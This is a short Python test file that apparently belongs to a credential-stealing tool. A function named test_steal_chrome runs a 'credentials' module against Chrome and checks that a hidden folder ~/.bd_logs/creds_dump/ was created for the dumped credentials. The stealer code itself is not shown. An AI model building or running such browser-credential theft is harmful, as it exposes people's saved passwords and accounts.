from modules import credentials
import os

def test_steal_chrome():
    result = credentials.run("chrome")
    assert "Chrome" in result
    path = os.path.expanduser("~/.bd_logs/creds_dump/")
    assert os.path.exists(path)
